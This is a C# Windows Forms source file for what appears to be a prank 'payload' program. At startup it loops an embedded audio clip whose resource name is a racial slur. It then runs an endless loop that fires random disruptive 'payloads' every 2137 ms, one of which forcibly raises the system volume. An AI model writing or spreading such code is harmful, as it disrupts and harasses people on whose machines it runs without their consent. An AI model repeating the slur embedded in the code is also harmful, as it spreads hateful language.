using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Media;
using System.IO;
using System.Runtime.InteropServices;
using AudioSwitcher.AudioApi.CoreAudio;

namespace ai_floydziak
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();

            new Thread(() =>
            {
                using (var audioStream = new MemoryStream(Properties.Resources.nigger))
                {
                    var player = new SoundPlayer(audioStream);
                    player.PlayLooping();
                }
            }).Start();
            RandomPayload();
        }

        public void RandomPayload()
        {
            Payload payload = new Payload();

            while (true)
            {
                Random random = new Random();
                int x = random.Next(1, 6);

                switch (x)
                {
                    case 1:
                        payload.Payload1();
                        break;
                    case 2:
                        payload.Payload2();
                        break;
                    case 3:
                        VOL();
                        break;
                    case 4:
                        // Uruchamiamy `InsertKremowka()` w nowym wątku
                        new Thread(() => payload.InsertKremowka()).Start();
                        break;
                    case 5:
                        payload.Payload3();
                        break;
                }

                Thread.Sleep(2137);
            }
        }

        public void VOL()
        {
            CoreAudioDevice defaultDevice = new CoreAudioController().DefaultPlaybackDevice;

            for (int i = 0; i < 50; i++)
            {
                defaultDevice.Volume += 1;
            }
        }
    }
}
